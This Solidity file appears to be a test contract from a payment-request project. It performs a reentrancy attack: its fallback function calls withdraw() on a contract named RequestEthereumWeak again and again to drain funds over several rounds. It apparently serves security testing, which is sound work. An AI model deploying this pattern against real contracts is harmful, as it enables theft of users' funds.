pragma solidity ^0.4.11;


contract RequestEthereumWeak {

    function createRequest(address _payee, address _payer, uint _amountExpected, address[3] _extensions, bytes32[9] _extensionParams0) returns(uint);

    function withdraw();

}


contract TestRequestReentrance {

    address contractAdd;
    uint8 round;

    event Log(uint id);

    function TestRequestReentrance(address _contract, uint8 _round) {
        contractAdd = _contract;
        round = _round;
    }

    function init(address _payer) {
        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
        bytes32[9] memory empty;
        address[3] memory emptyAddress;
        uint id = weakContract.createRequest(this, _payer, 100000000000000000, emptyAddress, empty);
        Log(id);
    }

    function start() {
        round--;
        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
        weakContract.withdraw();
    }

    // Launcher -------------------------------------------------
    function ()
        payable
    {   
        if(round != 0) {
            round--;
            RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
            weakContract.withdraw();
        }
    } 
}

